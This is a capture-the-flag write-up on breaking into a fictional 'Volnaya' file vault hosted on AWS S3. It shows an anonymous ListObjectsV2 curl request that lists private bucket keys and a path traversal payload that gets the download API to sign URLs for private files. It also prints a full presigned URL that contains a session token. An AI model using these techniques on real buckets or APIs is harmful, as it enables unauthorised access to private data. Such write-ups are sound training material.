# Description

During the reconnaissance phase, we discovered Volnaya’s file vault. While it appears to only display public files, our intel suggests it’s also being used to store sensitive information. We need your help retrieving those files—they’re critical to our mission.

URL: [http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/](http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/)
# Skills Required


- Basic AWS S3 knowledge
- Basic web application knowledge
- Basic API testing
# Skills Learned


- AWS S3 misconfiguration
- Path traversal vulnerability

# Solve

First lets start enumerating this website.

![](Images/Pasted%20image%2020250526121448.png)

Basic looking websites with some download buttons.

Downloading one of the files shows us how its all done.

When press the download a file it sends a POST request to the API containing the filename parameter.

![](Images/Pasted%20image%2020250526121655.png)

It responds by providing a URL

```
"url":"https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/public/Canteen_Water_Safety_Bulletin_2024_Q1.txt?response-content-disposition=attachment%3B%20filename%3D%22Canteen_Water_Safety_Bulletin_2024_Q1.txt%22&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIARHJJMXKM5RJR7QWG%2F20250526%2Feu-north-1%2Fs3%2Faws4_request&X-Amz-Date=20250526T161500Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHsaCmV1LW5vcnRoLTEiRzBFAiEAswQXF4vPoBUoo1dwLLp7n0h2%2F2siS1AMzuJJDDgXa9QCIFGG4ON2KajqMCChdsHm66P7J03JWPKnh%2FXQaflSWO8eKoIECEUQABoMMDg0Mzc1NTUwNjE3IgwtndyCotfupQJwYwoq3wNiNPEvnkQDCFj6C2xl0duYPs%2BPmNGlLfy%2FCs2B5XTLrTYezKclBjNA29mqi9TMWN3gS%2B6dxnxDj7QmKbTbY2FooPqgNrj4bTxWWuC3N4QpevWxMj94a8L3hvcjc4Va6p9KdnCdCshJ1GntkyafGfG2Hk3z4dwie91F3QTZi%2BdwwjWP%2FpSwGZs1fhvW06iV9KU8CaC9XICi89inZnojae8t69lxVxQng0Y5MqciZbAt1IC%2FPl2LWPK4%2FefCpS3lUykPfGLSESswYlfTl%2FNZ014siEMdWP2SSoA7GElzM4Z4PqsXCwW6lBr3i0ove68pKix%2FQsxbXdtji2b366dpI4UTW4ZBrDOzmwJnVzla%2BA1hoDQHhkzPKdq9WcPKq8GbNfbZm06KGIbphBXkEZmyIp9wNSiaRgokqC%2BavE%2FeLikf7WcNrLRZ9hObUa%2F2rFNZXZ859GcktXtGYOYWWym8EKg%2FGkCjKvd3ErcWItpAraerWgF7E%2FsXj20l%2Bp59uxziECGuqr8WiCjFCkxbyzQVraUc8XOFMcIE%2Balq36AfOoxT7UG9qi2qd8WgTb3EgMVeART5%2BtFgTY7PMZzRcGgp%2FaLGaJkF%2F56yeyjEUQWuNGVTg4UrZd%2ByyRs%2FJVsn7nFgSzDnndHBBjqlASKAiE2vmapFDfpjGdjSwAqElG5fOlVbnNhhmS9ZyaTzlYuXdQfP%2FKuack5NT7WSqZhAfS9j7b8mz4%2BiKOknOtWx5CYZq6m1yE8MUXmPpCD%2BOW0Oy1%2B1JDwFvD%2FjMiyPAxlgDfXKa7csMqdo4FujgjhHTVhobrQGxxtRtboL6huPP1gn9uJFOWr8j282P6Jwf1NbNVhDOsuaqk8OY9ig79Zd2%2BxGxQ%3D%3D&X-Amz-Signature=8f98c80dee57cfbc384d20d25c4fea7a35ed89cbca03761f697418acae6720fa"
```

Basically when we download a file the frontend sends a post request that returns a signed url to a private object in an S3 bucket. This is limited to the respective file.

We also have the `/api/files` which lists out all of the files

![](Images/Pasted%20image%2020250526122316.png)

We can potentially get data to leak by modifying the parameter. This was unsuccessful as passing it any parameter even if nonexistent just returned all public files.

Lets see if we can potentially do some enumerating via the post request to API/Downloads.

![](Images/Pasted%20image%2020250526123335.png)

Passing some payloads to this doesn't really return much as it encodes and treats as a filename string.

Filename is also required from by the API so I could not FUZZ file ids.

After a while of bashing my head I found I could use ListObjectsV2 to dump everything

```
curl "https://volnaya-vault.s3.eu-north-1.amazonaws.com/?list-type=2"

<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>volnaya-vault</Name><Prefix></Prefix><KeyCount>6</KeyCount><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>vault/private/DIRECTORATE ALPHA &amp; BETA FIELD OPERATIVES.docx</Key><LastModified>2025-05-21T19:44:14.000Z</LastModified><ETag>&quot;56d7c4cd052a619d0efe221440e59b7b&quot;</ETag><ChecksumAlgorithm>CRC32</ChecksumAlgorithm><ChecksumType>FULL_OBJECT</ChecksumType><Size>4890</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>vault/private/_Post-Assessment Report.pdf</Key><LastModified>2025-05-21T19:44:14.000Z</LastModified><ETag>&quot;12bbe4f2fdc7529c233d30c35fccc0d8&quot;</ETag><ChecksumAlgorithm>CRC32</ChecksumAlgorithm><ChecksumType>FULL_OBJECT</ChecksumType><Size>3064188</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>vault/public/Canteen_Water_Safety_Bulletin_2024_Q1.txt</Key><LastModified>2025-05-21T19:44:14.000Z</LastModified><ETag>&quot;74a9ba58fd1cd36839790cfdec8bca8b&quot;</ETag><ChecksumAlgorithm>CRC32</ChecksumAlgorithm><ChecksumType>FULL_OBJECT</ChecksumType><Size>1861</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>vault/public/PR_Volnaya_Cyber_Forces_Image_Pack_Approved.zip</Key><LastModified>2025-05-21T19:44:14.000Z</LastModified><ETag>&quot;775bf1613630e55be516e7137ffc9de2&quot;</ETag><ChecksumAlgorithm>CRC32</ChecksumAlgorithm><ChecksumType>FULL_OBJECT</ChecksumType><Size>3351538</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>vault/public/Vehicle_Log_Update_VZ-TRK-1138.txt</Key><LastModified>2025-05-21T19:44:14.000Z</LastModified><ETag>&quot;eed221ffac5d274c5bb6814a10896e7d&quot;</ETag><ChecksumAlgorithm>CRC32</ChecksumAlgorithm><ChecksumType>FULL_OBJECT</ChecksumType><Size>424</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>vault/public/propaganda.png</Key><LastModified>2025-05-21T19:44:14.000Z</LastModified><ETag>&quot;4b55f86a419a9fcea748046c3408a793&quot;</ETag><ChecksumAlgorithm>CRC32</ChecksumAlgorithm><ChecksumType>FULL_OBJECT</ChecksumType><Size>2513133</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult> 
```

From this we find the secret files
```
<Key>
vault/private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx
</Key>
<LastModified>2025-05-21T19:44:14.000Z</LastModified>
<ETag>"56d7c4cd052a619d0efe221440e59b7b"</ETag>
<ChecksumAlgorithm>CRC32</ChecksumAlgorithm>
<ChecksumType>FULL_OBJECT</ChecksumType>
<Size>4890</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
<Contents>
<Key>vault/private/_Post-Assessment Report.pdf</Key>
<LastModified>2025-05-21T19:44:14.000Z</LastModified>
<ETag>"12bbe4f2fdc7529c233d30c35fccc0d8"</ETag>
<ChecksumAlgorithm>CRC32</ChecksumAlgorithm>
<ChecksumType>FULL_OBJECT</ChecksumType>
<Size>3064188</Size>
<StorageClass>STANDARD</StorageClass>
```

We can use the API to try and generate our signed URL.

![](Images/Pasted%20image%2020250526131649.png)

But that doesn't appear to work as it generates it for the /vault/public directory. We can attempt to tell it to do vault/private

![](Images/Pasted%20image%2020250526131716.png)

That just appended it but it does take out input. So we know we have potential path traversal.

```
{"filename":"../../vault/private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx"}
```

Works and generates a signed url for the private files.

![](Images/Pasted%20image%2020250526131806.png)


